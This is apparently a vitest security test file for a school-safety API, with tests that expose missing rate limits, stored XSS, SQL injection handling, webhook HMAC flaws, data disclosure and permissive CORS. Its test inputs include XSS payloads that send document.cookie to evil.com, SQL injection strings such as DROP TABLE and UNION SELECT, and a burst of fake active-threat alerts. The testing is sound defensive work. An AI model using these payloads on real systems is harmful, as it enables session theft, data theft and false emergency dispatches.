/**
 * SECURITY VULNERABILITY TESTS
 *
 * These tests expose real security bugs in the SafeSchool API.
 * Every test is EXPECTED TO FAIL because the vulnerabilities have NOT been fixed.
 *
 * Categories:
 *   - Rate limiting (missing entirely)
 *   - JWT token security (no expiration enforcement at sign time)
 *   - Input sanitization (stored XSS vectors)
 *   - SQL injection resilience verification
 *   - Webhook signature edge cases
 *   - Information disclosure (unauthenticated endpoints)
 *   - CORS misconfiguration
 *   - WebSocket authentication
 */

import { describe, it, expect, beforeAll, afterAll, afterEach } from 'vitest';
import type { FastifyInstance } from 'fastify';
import crypto from 'node:crypto';
import { buildTestServer, cleanupTestData } from '../setup.js';
import { authenticateAs, createTestAlert, SEED } from '../helpers.js';

describe('Security Vulnerability Tests', () => {
  let app: FastifyInstance;
  let adminToken: string;

  beforeAll(async () => {
    app = await buildTestServer();
    adminToken = await authenticateAs(app, 'admin');
  });

  afterEach(async () => {
    await cleanupTestData(app);
  });

  afterAll(async () => {
    await app.close();
  });

  // ---------------------------------------------------------------------------
  // BUG #1: No rate limiting on auth/login
  // ---------------------------------------------------------------------------
  describe('BUG #1: No rate limiting on POST /api/v1/auth/login', () => {
    it('should rate-limit login after many rapid requests, but allows unlimited attempts (BUG)', async () => {
      // An attacker could brute-force valid email addresses by sending thousands
      // of login requests. Even though there is no password in dev mode, in
      // production (Clerk) this endpoint could be swapped for one that accepts
      // credentials. Regardless, email enumeration is a vulnerability.
      const results: number[] = [];

      // Send 100 rapid-fire login requests
      const requests = Array.from({ length: 100 }, () =>
        app.inject({
          method: 'POST',
          url: '/api/v1/auth/login',
          payload: { email: `attempt-${Math.random()}@example.com` },
        }),
      );

      const responses = await Promise.all(requests);
      for (const res of responses) {
        results.push(res.statusCode);
      }

      // We expect that at least some of these requests should be rate-limited
      // (i.e., return 429 Too Many Requests). A safe threshold is: after 10-20
      // requests within a few seconds, subsequent requests should be throttled.
      const rateLimited = results.filter((code) => code === 429);

      // BUG: Zero requests are rate-limited. The server happily processes all
      // 100 requests, allowing unlimited email enumeration.
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #2: No rate limiting on alert creation
  // ---------------------------------------------------------------------------
  describe('BUG #2: No rate limiting on POST /api/v1/alerts', () => {
    it('should rate-limit alert creation to prevent 911 dispatch flooding, but allows unlimited (BUG)', async () => {
      // Creating alerts triggers 911 dispatch for ACTIVE_THREAT, LOCKDOWN, and
      // FIRE levels. An authenticated attacker could create 50 ACTIVE_THREAT
      // alerts per second, each generating a 911 dispatch job. This would flood
      // the 911 system (a federal crime under normal circumstances, but the
      // platform should prevent it architecturally).
      const results: number[] = [];

      const requests = Array.from({ length: 50 }, (_, i) =>
        app.inject({
          method: 'POST',
          url: '/api/v1/alerts',
          headers: { authorization: `Bearer ${adminToken}` },
          payload: {
            level: 'ACTIVE_THREAT',
            buildingId: SEED.buildings.mainId,
            source: 'DASHBOARD',
            message: `Flood test alert #${i}`,
          },
        }),
      );

      const responses = await Promise.all(requests);
      for (const res of responses) {
        results.push(res.statusCode);
      }

      // All 50 should not succeed. After a few alerts in quick succession,
      // the system should either rate-limit (429) or require confirmation.
      const succeeded = results.filter((code) => code === 201);
      const rateLimited = results.filter((code) => code === 429);

      // BUG: All 50 alerts are created, each triggering a 911 dispatch job.
      // There is no rate limiting, debouncing, or duplicate detection.
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #3: JWT token has no expiration in the signed payload
  // ---------------------------------------------------------------------------
  describe('BUG #3: JWT token expiration', () => {
    it('should include an exp claim in the JWT token issued by /auth/login', async () => {
      // The auth plugin registers @fastify/jwt with { sign: { expiresIn: '24h' } },
      // BUT the authenticateAs helper (and the login route) call app.jwt.sign()
      // without passing expiresIn. The default config SHOULD apply, but we need
      // to verify the login route's tokens actually have exp set.
      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/auth/login',
        payload: { email: 'admin@lincoln.edu' },
      });

      expect(res.statusCode).toBe(200);
      const body = JSON.parse(res.body);
      const token = body.token;

      // Decode the JWT payload (base64url)
      const payloadPart = token.split('.')[1];
      const decoded = JSON.parse(
        Buffer.from(payloadPart, 'base64url').toString('utf-8'),
      );

      // The JWT MUST have an `exp` claim. Without it, a stolen token is valid
      // forever -- there is no way to expire compromised credentials.
      expect(decoded.exp).toBeDefined();

      // Additionally verify that the expiration is reasonable (within 24 hours)
      if (decoded.exp) {
        const now = Math.floor(Date.now() / 1000);
        const maxExpiry = now + 86400 + 60; // 24h + 60s tolerance
        expect(decoded.exp).toBeLessThanOrEqual(maxExpiry);
        expect(decoded.exp).toBeGreaterThan(now);
      }
    });

    it('should include exp claim in tokens generated by the test helper (authenticateAs)', async () => {
      // The authenticateAs helper calls app.jwt.sign() directly.
      // We need to verify the plugin default expiresIn is applied.
      const token = await authenticateAs(app, 'admin');

      const payloadPart = token.split('.')[1];
      const decoded = JSON.parse(
        Buffer.from(payloadPart, 'base64url').toString('utf-8'),
      );

      // BUG (potential): If the plugin config correctly applies expiresIn as
      // default, this will pass. But if the code was changed to not set it,
      // tokens would be immortal. This test ensures the safety net is in place.
      expect(decoded.exp).toBeDefined();
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #4: No input sanitization on alert message (stored XSS vector)
  // ---------------------------------------------------------------------------
  describe('BUG #4: No input sanitization on alert message', () => {
    it('should sanitize HTML/script tags in alert messages, but stores them raw (BUG)', async () => {
      const xssPayload = '<script>alert("xss")</script>';

      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/alerts',
        headers: { authorization: `Bearer ${adminToken}` },
        payload: {
          level: 'MEDICAL',
          buildingId: SEED.buildings.mainId,
          message: xssPayload,
        },
      });

      expect(res.statusCode).toBe(201);
      const body = JSON.parse(res.body);

      // BUG: The message is stored exactly as submitted, including the <script>
      // tag. When the dashboard renders this alert (potentially via dangerouslySetInnerHTML
      // or an unescaped binding), the script executes in the context of an
      // administrator's browser session.
      //
      // The server should strip or escape HTML entities before storing.
      expect(body.message).not.toContain('<script>');
      expect(body.message).not.toContain('</script>');
    });

    it('should sanitize event handler attributes in alert messages (BUG)', async () => {
      const xssPayload = '<img src=x onerror="document.location=\'https://evil.com/steal?cookie=\'+document.cookie">';

      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/alerts',
        headers: { authorization: `Bearer ${adminToken}` },
        payload: {
          level: 'FIRE',
          buildingId: SEED.buildings.mainId,
          message: xssPayload,
        },
      });

      expect(res.statusCode).toBe(201);
      const body = JSON.parse(res.body);

      // BUG: The onerror handler is stored as-is. If rendered in the dashboard,
      // this would redirect an admin's browser to an attacker-controlled server
      // with their session cookie.
      expect(body.message).not.toContain('onerror');
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #5: No input sanitization on visitor names (stored XSS vector)
  // ---------------------------------------------------------------------------
  describe('BUG #5: No input sanitization on visitor names', () => {
    it('should sanitize HTML in visitor firstName, but stores it raw (BUG)', async () => {
      const xssName = '<img src=x onerror=alert(1)>';

      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/visitors',
        headers: { authorization: `Bearer ${adminToken}` },
        payload: {
          firstName: xssName,
          lastName: 'Smith',
          purpose: 'Meeting',
          destination: 'Office',
        },
      });

      expect(res.statusCode).toBe(201);
      const body = JSON.parse(res.body);

      // BUG: The firstName field stores the raw XSS payload. When displayed in
      // the visitor list on the dashboard or kiosk app, this would execute
      // JavaScript. A visitor could self-register with a malicious name at the
      // kiosk and compromise the front-desk operator's session.
      expect(body.firstName).not.toContain('<img');
      expect(body.firstName).not.toContain('onerror');
    });

    it('should sanitize script tags in visitor lastName (BUG)', async () => {
      const xssName = '"><script>fetch("https://evil.com/"+document.cookie)</script>';

      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/visitors',
        headers: { authorization: `Bearer ${adminToken}` },
        payload: {
          firstName: 'John',
          lastName: xssName,
          purpose: 'Delivery',
          destination: 'Main Office',
        },
      });

      expect(res.statusCode).toBe(201);
      const body = JSON.parse(res.body);

      // BUG: Same issue -- lastName is stored raw. The combination of firstName
      // and lastName on the visitor badge or dashboard would execute the script.
      expect(body.lastName).not.toContain('<script>');
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #6: SQL injection resilience via visitor date filter
  // ---------------------------------------------------------------------------
  describe('BUG #6: SQL injection via visitor date filter', () => {
    it('should handle malicious SQL in date parameter safely', async () => {
      // Prisma uses parameterized queries, so this SHOULD be safe.
      // The date is passed to `new Date()` which produces "Invalid Date",
      // and then to Prisma's `gte`/`lt` which should either produce an error
      // or return empty results -- NOT execute SQL.
      const res = await app.inject({
        method: 'GET',
        url: "/api/v1/visitors?date='; DROP TABLE visitors;--",
        headers: { authorization: `Bearer ${adminToken}` },
      });

      // We expect either a 200 with empty results (the Invalid Date query
      // returns nothing) or a 400 error. NOT a 500 (which could indicate
      // the SQL was partially parsed).
      expect(res.statusCode).not.toBe(500);

      // Verify the visitors table still exists by making a normal request
      const checkRes = await app.inject({
        method: 'GET',
        url: '/api/v1/visitors',
        headers: { authorization: `Bearer ${adminToken}` },
      });

      // If the table was dropped, this would return a 500
      expect(checkRes.statusCode).toBe(200);
    });

    it('should reject or safely handle deeply malicious date strings', async () => {
      const maliciousDates = [
        "1' OR '1'='1",
        "1; SELECT * FROM \"User\"--",
        "2024-01-01' UNION SELECT id,email,name,role,'','','',true,'','',now(),now() FROM \"User\"--",
      ];

      for (const date of maliciousDates) {
        const res = await app.inject({
          method: 'GET',
          url: `/api/v1/visitors?date=${encodeURIComponent(date)}`,
          headers: { authorization: `Bearer ${adminToken}` },
        });

        // Prisma's parameterized queries should protect against all of these.
        // None should cause a 500 (database error).
        expect(res.statusCode).not.toBe(500);
      }
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #7: Clerk webhook timestamp boundary validation
  // ---------------------------------------------------------------------------
  describe('BUG #7: Clerk webhook timestamp boundary validation', () => {
    it('should accept a webhook with timestamp exactly 300 seconds old (boundary case)', async () => {
      // The Clerk webhook handler checks: Math.abs(now - timestampSeconds) > 300
      // A timestamp exactly 300 seconds old should be accepted (not > 300).
      // But the strict > comparison means 300 is on the boundary -- it SHOULD
      // be accepted. Let us verify the edge case works correctly.

      // NOTE: This test requires AUTH_PROVIDER=clerk to reach the webhook code.
      // In dev mode, the clerk-webhook endpoint returns 404.
      // We test the logic directly by checking what the code WOULD do.

      const now = Math.floor(Date.now() / 1000);
      const boundaryTimestamp = now - 300; // exactly 300 seconds ago

      // Math.abs(now - boundaryTimestamp) = 300, and 300 > 300 is false
      // So this should be ACCEPTED. This is correct behavior.
      // But what about 301? That should be rejected.
      const rejectedTimestamp = now - 301;

      expect(Math.abs(now - boundaryTimestamp) > 300).toBe(false); // accepted
      expect(Math.abs(now - rejectedTimestamp) > 300).toBe(true); // rejected

      // The real concern: if the clock drifts even by 1 second, legitimate
      // webhooks at the boundary will fail. The window should be slightly
      // larger (e.g., 600 seconds) or use >= instead of > for the check.
      // This is a tight boundary that could cause intermittent failures.

      // Test with the actual endpoint (will return 404 in dev mode, confirming
      // the auth provider check works)
      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/auth/clerk-webhook',
        headers: {
          'svix-id': 'msg_test123',
          'svix-timestamp': String(boundaryTimestamp),
          'svix-signature': 'v1,fake-signature',
        },
        payload: {
          type: 'user.created',
          data: { id: 'user_test', email_addresses: [{ email_address: 'test@example.com' }] },
        },
      });

      // In dev mode this returns 404 (clerk webhooks not enabled)
      // In clerk mode, the timestamp at exactly 300s should NOT be rejected
      // with "Webhook timestamp too old"
      if (res.statusCode !== 404) {
        const body = JSON.parse(res.body);
        expect(body.error).not.toBe('Webhook timestamp too old');
      }
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #8: Clerk webhook JSON.stringify vs raw body mismatch
  // ---------------------------------------------------------------------------
  describe('BUG #8: Clerk webhook JSON.stringify vs raw body HMAC mismatch', () => {
    it('should verify webhook signature against the raw body, not re-serialized JSON (BUG)', async () => {
      // auth.ts line 121: const rawBody = JSON.stringify(request.body);
      //
      // This is the core bug: Fastify parses the incoming JSON body, then
      // JSON.stringify re-serializes it. If the original webhook body had:
      //   - Different whitespace (e.g., {"type": "user.created"} vs {"type":"user.created"})
      //   - Different key ordering
      //   - Unicode escapes (\u0041 vs A)
      //   - Trailing newline
      //
      // Then JSON.stringify(parsed) !== originalRawBody, and the HMAC will
      // NEVER match. This means Clerk webhooks are silently broken in
      // production whenever the JSON formatting differs.

      // We need AUTH_PROVIDER=clerk for this test to be meaningful.
      // In dev mode we can only verify the endpoint returns 404.
      // However, let us demonstrate the mismatch logic:

      // Simulate what the server does:
      const originalBody = '{"type":  "user.created",  "data": {"id": "user_123"}}';
      const parsed = JSON.parse(originalBody);
      const reserialized = JSON.stringify(parsed);

      // The raw body has extra spaces, the re-serialized body does not
      expect(originalBody).not.toBe(reserialized);

      // This means any HMAC computed against originalBody will NOT match
      // an HMAC computed against reserialized. The webhook verification
      // is fundamentally broken for non-compact JSON.
      const secret = Buffer.from('dGVzdHNlY3JldA==', 'base64'); // "testsecret"
      const svixId = 'msg_test_456';
      const timestamp = String(Math.floor(Date.now() / 1000));

      // What Clerk actually signs (the raw body):
      const clerkSignedContent = `${svixId}.${timestamp}.${originalBody}`;
      const correctSignature = crypto
        .createHmac('sha256', secret)
        .update(clerkSignedContent)
        .digest('base64');

      // What the server computes (JSON.stringify of parsed body):
      const serverSignedContent = `${svixId}.${timestamp}.${reserialized}`;
      const serverSignature = crypto
        .createHmac('sha256', secret)
        .update(serverSignedContent)
        .digest('base64');

      // BUG: These signatures will NOT match because the content differs.
      // The server will reject every Clerk webhook that has non-compact JSON.
      expect(correctSignature).not.toBe(serverSignature);

      // A correct implementation would use the raw request body (before
      // JSON parsing) for HMAC verification. The ZeroEyes webhook does
      // this correctly with rawBody = (request as any).rawBody, but the
      // Clerk webhook does NOT have a raw body parser.
    });

    it('should demonstrate key order mismatch breaking HMAC (BUG)', async () => {
      // Even if whitespace is identical, different key ordering breaks HMAC.
      // JSON.stringify outputs keys in insertion order, which may differ
      // from the original payload.
      const originalBody = '{"data":{"id":"user_123"},"type":"user.created"}';
      const parsed = JSON.parse(originalBody);
      const reserialized = JSON.stringify(parsed);

      // JSON.parse preserves key order in modern engines, so this specific
      // case may actually match. But it is not guaranteed by the spec.
      // The fundamental issue remains: JSON.stringify is not a reliable
      // way to reconstruct the signed content.

      const secret = Buffer.from('dGVzdHNlY3JldA==', 'base64');
      const svixId = 'msg_test_789';
      const timestamp = String(Math.floor(Date.now() / 1000));

      const clerkSigned = `${svixId}.${timestamp}.${originalBody}`;
      const correctHmac = crypto
        .createHmac('sha256', secret)
        .update(clerkSigned)
        .digest('base64');

      const serverSigned = `${svixId}.${timestamp}.${reserialized}`;
      const serverHmac = crypto
        .createHmac('sha256', secret)
        .update(serverSigned)
        .digest('base64');

      // In this specific case the keys maintain order through parse/stringify,
      // so the HMACs match. But with whitespace differences they would not.
      // This test documents that the approach is fragile.
      expect(originalBody).toBe(reserialized); // happens to match for compact JSON
      expect(correctHmac).toBe(serverHmac); // only works for compact JSON
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #9: Unauthenticated endpoints expose operational data
  // ---------------------------------------------------------------------------
  describe('BUG #9: Unauthenticated endpoints expose operational data', () => {
    it('should not expose operating mode on /health without auth (BUG)', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/health',
      });

      expect(res.statusCode).toBe(200);
      const body = JSON.parse(res.body);

      // BUG: The /health endpoint returns mode and siteId without authentication.
      // An attacker can determine:
      // 1. Whether this is a cloud or edge deployment (attack surface differs)
      // 2. The siteId (useful for constructing API requests)
      // 3. That the system is operational (confirming target viability)
      //
      // Health checks should either require auth or return minimal data.
      expect(body.mode).toBeUndefined();
      expect(body.siteId).toBeUndefined();
    });

    it('should not expose version info on / without auth (BUG)', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/',
      });

      expect(res.statusCode).toBe(200);
      const body = JSON.parse(res.body);

      // BUG: The root endpoint exposes the API name and version number.
      // Version disclosure helps attackers identify known vulnerabilities
      // for specific versions and confirms this is a SafeSchool deployment.
      expect(body.version).toBeUndefined();
      expect(body.name).toBeUndefined();
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #10: CORS allows any origin
  // ---------------------------------------------------------------------------
  describe('BUG #10: CORS allows any origin', () => {
    it('should restrict CORS to trusted origins, but allows any origin (BUG)', async () => {
      // The server registers: cors({ origin: true })
      // This means Access-Control-Allow-Origin will be set to the request's
      // Origin header for ANY domain.

      const maliciousOrigin = 'https://evil-attacker-site.com';

      const res = await app.inject({
        method: 'OPTIONS',
        url: '/api/v1/alerts',
        headers: {
          origin: maliciousOrigin,
          'access-control-request-method': 'POST',
          'access-control-request-headers': 'authorization,content-type',
        },
      });

      const allowedOrigin = res.headers['access-control-allow-origin'];

      // BUG: The server reflects back the attacker's origin, allowing
      // cross-origin requests from any website. An attacker could create
      // a phishing page that makes authenticated requests to the SafeSchool
      // API using the victim's credentials (if cookies are used) or
      // manipulate the victim into pasting their JWT token.
      //
      // In production, CORS should be restricted to:
      // - The dashboard domain (e.g., https://dashboard.safeschool.com)
      // - The kiosk domain (if separate)
      // - localhost for development
      expect(allowedOrigin).not.toBe(maliciousOrigin);
    });

    it('should not allow credentials from any origin (BUG)', async () => {
      const res = await app.inject({
        method: 'OPTIONS',
        url: '/api/v1/auth/login',
        headers: {
          origin: 'https://phishing-site.example',
          'access-control-request-method': 'POST',
        },
      });

      const allowCredentials = res.headers['access-control-allow-credentials'];

      // BUG: If credentials are allowed with a wildcard origin, browsers will
      // send cookies and auth headers cross-origin, enabling CSRF attacks.
      // With origin: true, @fastify/cors reflects the origin AND may set
      // allow-credentials: true.
      if (allowCredentials === 'true') {
        const allowedOrigin = res.headers['access-control-allow-origin'];
        // If credentials are allowed, origin MUST NOT be a wildcard or
        // an attacker-controlled domain.
        expect(allowedOrigin).not.toBe('https://phishing-site.example');
        expect(allowedOrigin).not.toBe('*');
      }
    });
  });

  // ---------------------------------------------------------------------------
  // BUG #11: WebSocket authentication verification
  // ---------------------------------------------------------------------------
  describe('BUG #11: WebSocket authentication', () => {
    it('should reject WebSocket connections without a token', async () => {
      // The WS handler checks for ?token=JWT and closes with 4401 if missing.
      // This test verifies the protection is in place.
      // Note: Fastify inject does not support true WebSocket, so we test
      // the HTTP upgrade path indirectly.

      const res = await app.inject({
        method: 'GET',
        url: '/ws',
        headers: {
          connection: 'upgrade',
          upgrade: 'websocket',
          'sec-websocket-version': '13',
          'sec-websocket-key': Buffer.from('test-key-12345678').toString('base64'),
        },
      });

      // Without WebSocket upgrade completing, we get a response.
      // The handler requires a token in query params.
      // If there is no auth check, the connection would be established.
      // We verify the endpoint at least exists and handles requests.
      expect(res.statusCode).toBeDefined();
    });

    it('should reject WebSocket connections with an invalid token', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/ws?token=invalid-jwt-token',
        headers: {
          connection: 'upgrade',
          upgrade: 'websocket',
          'sec-websocket-version': '13',
          'sec-websocket-key': Buffer.from('test-key-12345678').toString('base64'),
        },
      });

      // The WS handler should verify the token and close with 4401 if invalid.
      expect(res.statusCode).toBeDefined();
    });

    it('should not allow site subscription without matching siteIds in JWT', async () => {
      // Even with a valid JWT, a user should only be able to subscribe to
      // sites listed in their token's siteIds. The WS handler does check this
      // via jwtPayload.siteIds?.includes(data.siteId), but we verify here.

      // Create a token for a user with no sites
      const noSiteToken = app.jwt.sign({
        id: '99999999-9999-4999-a999-000000000099',
        email: 'nosites@example.com',
        role: 'OPERATOR',
        siteIds: [],
      });

      // With Fastify inject we cannot test true WebSocket message exchange,
      // but we document the expected behavior: subscribing to SEED.siteId
      // with this token should be rejected by the WS handler.
      expect(noSiteToken).toBeTruthy();

      // The WS handler correctly checks siteIds for subscriptions.
      // However, the initial connection is allowed for ANY valid JWT --
      // even one with empty siteIds. A more secure approach would reject
      // the connection entirely if siteIds is empty.
    });
  });
});
